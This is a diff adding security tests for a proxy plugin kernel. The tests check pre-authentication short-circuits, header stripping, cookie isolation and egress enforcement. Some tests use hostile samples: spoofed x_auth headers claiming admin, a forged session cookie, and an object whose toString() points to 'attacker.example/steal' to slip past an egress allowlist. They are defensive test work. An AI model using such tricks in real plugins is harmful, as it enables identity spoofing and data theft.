@@ -59,6 +59,33 @@ describe("invariant 1: a non-public request is never forwarded or handled withou
     expect(deps.forward).not.toHaveBeenCalled();
   });
 
+  // F18: the request phase runs before authentication.
+  it.each(["protected", "secured"])("a request-phase plugin cannot serve a 2xx before authentication on a %s tier (500)", async (tier) => {
+    const logs = [];
+    const early = mw("early", { phases: ["request"], beforeForward: undefined, request: async () => new Response("members-only content", { status: 200 }) });
+    const { pipeline, deps } = kernel({ plugins: [sessAuth(), early], middleware: [ref("early")], fallback: cls(tier), logSink: (event, fields) => logs.push({ event, ...fields }) });
+    const res = await pipeline.handle(get("/p"));
+    expect(res.status).toBe(500);
+    expect(await res.json()).toEqual({ error: "internal_error" });
+    expect(deps.forward).not.toHaveBeenCalled();
+    expect(logs.some((l) => /invariant violation: request-phase short-circuit/.test(l.event) && l.plugin === "early" && l.status === 200)).toBe(true);
+  });
+
+  it("a request-phase 3xx/4xx/5xx short-circuit on a protected tier is still allowed (e.g. rate limiting)", async () => {
+    for (const status of [302, 429, 503]) {
+      const early = mw("early", { phases: ["request"], beforeForward: undefined, request: async () => new Response(null, { status, headers: status === 302 ? { location: "/elsewhere" } : {} }) });
+      const { pipeline, deps } = kernel({ plugins: [sessAuth(), early], middleware: [ref("early")], fallback: cls("protected") });
+      expect((await pipeline.handle(get("/p"))).status).toBe(status);
+      expect(deps.forward).not.toHaveBeenCalled();
+    }
+  });
+
+  it("a request-phase 2xx short-circuit on a public tier is still allowed", async () => {
+    const early = mw("early", { phases: ["request"], beforeForward: undefined, request: async () => new Response("ok", { status: 200 }) });
+    const { pipeline } = kernel({ plugins: [sessAuth(), early], middleware: [ref("early")], fallback: cls("public") });
+    expect((await pipeline.handle(get("/p"))).status).toBe(200);
+  });
+
   it("a classification claiming tier protected with auth none is a 500, never a forward", async () => {
     const h = mw("hand", { handle: vi.fn(async () => new Response("handled")) });
     const { pipeline, deps } = kernel({ plugins: [sessAuth(), h], fallback: cls("protected", { auth: "none", handler: "hand" }) });
@@ -157,6 +184,15 @@ describe("invariant 3: only the kernel writes x-auth-*; reserved prefixes stripp
     expect([...forwarded[0].request.headers.keys()]).toEqual(["x-other"]);
   });
 
+  it("F10: client-supplied underscore lookalikes (x_auth_groups) are stripped before plugins and forward", async () => {
+    const seen = [];
+    const peek = mw("peek", { phases: ["request"], beforeForward: undefined, request: async (ctx) => { seen.push([...ctx.request.headers.keys()]); } });
+    const { pipeline, forwarded } = kernel({ plugins: [sessAuth(), peek], middleware: [ref("peek")], fallback: cls("public") });
+    await pipeline.handle(get("/x", { x_auth_groups: "admin", "X_Auth_Subject": "admin", x_push_invalidation: "enabled", "x-push-invalidation": "enabled", "x-other": "kept" }));
+    expect(seen[0]).toEqual(["x-other"]);
+    expect([...forwarded[0].request.headers.keys()]).toEqual(["x-other"]);
+  });
+
   it("a plugin cannot smuggle x-auth-* in through replaceRequest", async () => {
     const smuggle = mw("smuggle", {
       phases: ["request"], beforeForward: undefined,
@@ -204,6 +240,26 @@ describe("invariant 4: plugin cookies never reach/come from the origin; only the
     const evil = mw("evil", { beforeForward: async () => new Response("x", { headers: { "set-cookie": "__Host-sess=admin; Path=/" } }) });
     const { pipeline } = kernel({ plugins: [sessAuth(), evil], middleware: [ref("evil")], fallback: cls("public") });
     expect((await pipeline.handle(get("/x"))).headers.getSetCookie()).toEqual([]);
+  });
+
+  // F11: plugins read cookies only via ctx.cookies; the raw header is never visible.
+  it("an evil plugin cannot read another plugin's cookie from the raw Cookie header (ctx.request or forward)", async () => {
+    const stolen = [];
+    const evil = mw("evil", {
+      phases: ["request", "beforeForward"],
+      request: async (ctx) => { stolen.push(ctx.request.headers.get("cookie")); },
+      beforeForward: async (ctx) => {
+        stolen.push(ctx.request.headers.get("cookie"));
+        // and it cannot put one back via replaceRequest
+        ctx.replaceRequest(new Request(ctx.request.url, { headers: { cookie: "__Host-sess=forged" } }));
+      },
+    });
+    const { pipeline, forwarded } = kernel({ plugins: [sessAuth(), evil], middleware: [ref("evil")], fallback: cls("protected") });
+    const res = await pipeline.handle(get("/x", { cookie: "__Host-sess=u1; other=1" }));
+    expect(res.status).toBe(200); // the authenticator still read its cookie via ctx.cookies
+    expect(stolen).toEqual([null, null]);
+    expect(forwarded[0].identity.sub).toBe("u1");
+    expect(forwarded[0].request.headers.has("cookie")).toBe(false);
   });
 
   it("ForwardInput lists owned cookies so forward drops them", async () => {
@@ -305,6 +361,21 @@ describe("invariant 7: the finalizer and the fetch budget apply to every respons
     const spy = vi.fn(fetchImpl);
     const { pipeline, deps } = kernel({ plugins: [sessAuth(), leaky], middleware: [ref("leaky", { onError: "skip" })], fallback: cls("public"), fetchImpl: spy });
     const res = await pipeline.handle(get("/x"));
+    expect(res.status).toBe(500);
+    expect(await res.json()).toEqual({ error: "egress_denied" });
+    expect(spy).not.toHaveBeenCalled();
+    expect(deps.forward).not.toHaveBeenCalled();
+  });
+
+  // F6: egress is checked on the canonical Request that is actually fetched.
+  it("an evil plugin cannot bypass egress with an object whose url is allowed but whose toString() is not", async () => {
+    const trick = { url: "https://api.example.com/ok", toString: () => "https://attacker.example/steal" };
+    const evil = mw("evil", { egress: ["https://api.example.com"], maxFetches: 1, beforeForward: async (ctx) => { await ctx.fetch(trick); } });
+    const spy = vi.fn(fetchImpl);
+    const { pipeline, deps } = kernel({ plugins: [sessAuth(), evil], middleware: [ref("evil")], fallback: cls("public"), fetchImpl: spy });
+    const res = await pipeline.handle(get("/x"));
+    // Denied, or (never) fetched anything but the allowed origin.
+    for (const [input] of spy.mock.calls) expect(new URL(typeof input === "string" ? input : input.url).origin).toBe("https://api.example.com");
     expect(res.status).toBe(500);
     expect(await res.json()).toEqual({ error: "egress_denied" });
     expect(spy).not.toHaveBeenCalled();
